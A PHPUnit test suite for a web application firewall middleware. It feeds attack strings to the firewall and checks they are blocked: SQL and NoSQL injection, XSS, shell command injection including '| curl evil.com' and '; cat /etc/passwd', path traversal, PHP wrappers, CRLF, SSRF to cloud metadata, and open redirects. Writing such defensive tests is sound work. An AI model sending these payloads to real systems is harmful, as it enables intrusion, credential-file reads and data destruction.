<?php

namespace Tests\security;

use PHPUnit\Framework\TestCase;

require_once __DIR__ . '/WafTestSupport.php';

final class WafMiddlewareTest extends TestCase
{
    private TestableWafMiddleware $middleware;

    protected function setUp(): void
    {
        parent::setUp();
        $this->middleware = new TestableWafMiddleware();
    }

    private function createRequest(string $path = '/api/products', array $data = [], string $ua = 'Mozilla/5.0', string $queryString = '', string $contentType = 'application/json')
    {
        return WafTestSupport::createRequest($path, $data, $ua, $queryString, $contentType);
    }

    private function decodeResponse($response): array
    {
        if (is_string($response)) return json_decode($response, true) ?? [];
        if (method_exists($response, 'rawBody')) return json_decode($response->rawBody(), true) ?? [];
        return [];
    }

    // ── SQL Injection Tests ──

    public function testBlocksSqlUnionSelect(): void
    {
        $req = $this->createRequest('/api/products', ['q' => "1' UNION SELECT * FROM users"]);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
        $this->assertStringContainsString('WAF', $body['message'] ?? '');
    }

    public function testBlocksSqlCommentInjection(): void
    {
        $req = $this->createRequest('/api/auth/login', ['email' => "admin'--", 'password' => 'x']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksOrOneEqualsOne(): void
    {
        $req = $this->createRequest('/api/auth/login', ['email' => "' OR '1'='1", 'password' => 'x']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksDropTable(): void
    {
        $req = $this->createRequest('/api/products', ['name' => 'x; DROP TABLE users;--']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    // ── XSS Tests ──

    public function testBlocksScriptTag(): void
    {
        $req = $this->createRequest('/api/products', ['name' => '<script>alert(1)</script>']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksScriptTagWithSpaces(): void
    {
        $req = $this->createRequest('/api/products', ['name' => '< s c r i p t >alert(1)< / s c r i p t >']);
        // This tests the whitespace-agnostic pattern
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksOnclickHandler(): void
    {
        $req = $this->createRequest('/api/products', ['desc' => '<div onclick="steal()">click</div>']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksOnErrorHandler(): void
    {
        $req = $this->createRequest('/api/products', ['img' => '<img src=x onerror=alert(1)>']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksJavascriptProtocol(): void
    {
        $req = $this->createRequest('/api/products', ['url' => 'javascript:alert(document.cookie)']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksEvalFunction(): void
    {
        $req = $this->createRequest('/api/products', ['code' => 'eval(atob("YWxlcnQoMSk="))']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    // ── Command Injection Tests ──

    public function testBlocksCatEtcPasswd(): void
    {
        $req = $this->createRequest('/api/resources', ['hostname' => 'localhost; cat /etc/passwd']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksCurlCommand(): void
    {
        $req = $this->createRequest('/api/resources', ['url' => 'http://safe.com | curl evil.com']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksBacktickCommandSubstitution(): void
    {
        $req = $this->createRequest('/api/resources', ['name' => '`whoami`']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksDollarParenCommandSubstitution(): void
    {
        $req = $this->createRequest('/api/resources', ['name' => '$(id)']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    // ── File Inclusion / Path Traversal Tests ──

    public function testBlocksPathTraversal(): void
    {
        $req = $this->createRequest('/api/products', ['file' => '../../../etc/passwd']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksPhpWrapper(): void
    {
        $req = $this->createRequest('/api/products', ['template' => 'php://filter/convert.base64-encode/resource=config.php']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksDataWrapper(): void
    {
        $req = $this->createRequest('/api/products', ['template' => 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    // ── Safe input pass-through tests ──

    public function testAllowsNormalInput(): void
    {
        $req = $this->createRequest('/api/products', ['name' => 'Cloud Server VPS', 'price' => '29.99']);
        $nextCalled = false;
        $this->middleware->process($req, function ($r) use (&$nextCalled) {
            $nextCalled = true;
            return response('ok');
        });
        $this->assertTrue($nextCalled);
    }

    public function testAllowsJsonBody(): void
    {
        $req = $this->createRequest('/api/orders', [
            'sku_id' => 12345,
            'region_id' => 2,
            'quantity' => 1,
            'cycle' => 'monthly',
        ]);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $this->assertSame(200, $result->getStatusCode());
    }

    public function testAllowsUnicodeContent(): void
    {
        $req = $this->createRequest('/api/products', ['name' => '高性能云服务器 VPS 東京リージョン']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $this->assertSame(200, $result->getStatusCode());
    }

    // ── Header injection tests ──

    public function testBlocksCrlfInjectionInQueryString(): void
    {
        $req = $this->createRequest('/api/products', [], 'Mozilla/5.0', 'name=safe%0d%0aHost:%20evil.com');
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksCrlfInjectionInBody(): void
    {
        // Raw body scan (simulated via User-Agent since test can't mock php://input)
        $req = $this->createRequest('/api/products', [], "safe\r\nHost: evil.com");
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    // ── URL path scanning tests ──

    public function testBlocksAttackInUrlPath(): void
    {
        $req = $this->createRequest('/api/products/../../etc/passwd', []);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    // ── User-Agent scanning tests ──

    public function testBlocksAttackInUserAgent(): void
    {
        $req = $this->createRequest('/api/products', [], "' OR '1'='1");
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    // ── SSRF Tests ──

    public function testBlocksSsrfLocalhost(): void
    {
        $req = $this->createRequest('/api/products', ['webhook_url' => 'http://localhost:8080/admin']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksSsrf127001(): void
    {
        $req = $this->createRequest('/api/products', ['callback' => 'http://127.0.0.1:3000/api']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksSsrf192168(): void
    {
        $req = $this->createRequest('/api/products', ['url' => 'http://192.168.1.1/admin']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksSsrfCloudMetadata(): void
    {
        $req = $this->createRequest('/api/products', ['url' => 'http://169.254.169.254/latest/meta-data/']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksSsrfFileProtocol(): void
    {
        $req = $this->createRequest('/api/products', ['url' => 'file:///etc/passwd']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    // ── NoSQL Injection Tests ──

    public function testBlocksNosqlWhereOperator(): void
    {
        $req = $this->createRequest('/api/products', ['query' => '{"$where": "this.role==\'admin\'"}']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksNosqlGtOperator(): void
    {
        $req = $this->createRequest('/api/products', ['filter' => '{"price": {"$gt": 0}}']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksNosqlRegexOperator(): void
    {
        $req = $this->createRequest('/api/products', ['email' => '{"$regex": "^admin"}']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testBlocksRedisFlushall(): void
    {
        $req = $this->createRequest('/api/products', ['cmd' => 'FLUSHALL']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    // ── Open Redirect Tests ──

    public function testBlocksOpenRedirect(): void
    {
        $req = $this->createRequest('/api/auth/login', ['redirect_uri' => 'https://evil.com/phishing']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $body = $this->decodeResponse($result);
        $this->assertSame(403, $body['code'] ?? 200);
    }

    public function testAllowsSameOriginRedirect(): void
    {
        $req = $this->createRequest('/api/auth/login', ['redirect_uri' => 'https://example.com/dashboard']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $this->assertSame(200, $result->getStatusCode());
    }

    // ── Legitimate data with special chars (no false positives) ──

    public function testAllowsPriceWithDollarSign(): void
    {
        $req = $this->createRequest('/api/products', ['price' => '$10.00', 'name' => 'Budget VPS']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $this->assertSame(200, $result->getStatusCode());
    }

    public function testAllowsEmailAddress(): void
    {
        $req = $this->createRequest('/api/auth/login', ['email' => 'user@example.com']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $this->assertSame(200, $result->getStatusCode());
    }

    // ── SQL-like words in plain text (no false positives) ──

    public function testAllowsSqlishWordsInPlainText(): void
    {
        $req = $this->createRequest('/api/tickets', [
            'message' => 'Please update your server settings, create a new order, and select the correct region. Exec finished.',
        ]);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $this->assertSame(200, $result->getStatusCode());
    }

    public function testAllowsCreateAndDeleteInTicket(): void
    {
        $req = $this->createRequest('/api/tickets', ['message' => 'How do I create a ticket to delete my account?']);
        $result = $this->middleware->process($req, fn($r) => response('ok'));
        $this->assertSame(200, $result->getStatusCode());
    }
}

